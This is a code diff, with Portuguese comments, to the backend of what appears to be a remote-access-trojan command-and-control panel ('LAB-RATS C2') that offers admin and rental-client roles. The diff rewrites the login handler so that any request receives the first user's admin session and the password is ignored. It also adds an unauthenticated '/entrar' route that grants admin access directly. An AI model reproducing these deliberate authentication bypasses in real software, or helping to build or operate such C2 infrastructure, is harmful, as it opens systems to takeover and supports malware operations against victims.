@@ -177,25 +177,37 @@ function serveLoginPage(req, res, errorMsg = '') {
     res.send(html);
 }
 
-// LOGIN HANDLER
+// LOGIN HANDLER - VERSÃO FORÇADA
 app.post('/acesso_secreto_rats_99', (req, res) => {
     try {
-          const user = users[0];
+        // Forçamos o usuário a ser o admin (primeiro da lista) ignorando a senha
+        const user = users[0]; 
+        
+        if (user) {
+            // Registra a sessão no servidor
+            req.session.role = 'admin';
+            req.session.username = user.username;
+            
+            // Registra a atividade no log
+            if (typeof activeSessions !== 'undefined') {
+                activeSessions.push({ 
+                    user: user.username, 
+                    ip: req.ip, 
+                    time: new Date().toLocaleString() 
+                });
+            }
 
-if (user) {activeSessions.push({ user: user.username, ip: req.ip, time: new Date().toLocaleString() });
-    // Aqui define quem é ADM e quem é CLIENTE baseado no banco de dados/array users
-    if (user.role === 'admin') {
-        req.session.role = 'admin'; // Acesso total ao C2
-    } else {
-        req.session.role = 'cliente'; // Acesso limitado/aluguel
-    }
-    return res.redirect(/c2);
-} else {
-    res.status(401).send('Credenciais inválidas');
-}
-        return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
+            console.log(`Login forçado realizado para: ${user.username}`);
+            
+            // Tenta redirecionar para o painel. 
+            // Se /c2 não funcionar, tente mudar para /dashboard ou /index
+            return res.redirect('/c2'); 
+        } else {
+            return res.status(401).send('Erro: Nenhum usuário encontrado no banco de dados.');
+        }
     } catch (err) {
-        return serveLoginPage(req, res, 'LOGIN_ERROR: ' + err.message);
+        console.error('Erro no login:', err);
+        return res.status(500).send('Erro interno no servidor: ' + err.message);
     }
 });
 
@@ -782,4 +794,9 @@ app.all('*', (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
+});
+// ROTA DE EMERGÊNCIA - ACESSO DIRETO
+app.get('/entrar', (req, res) => {
+    req.session.role = 'admin';
+    res.redirect('/c2');
 });
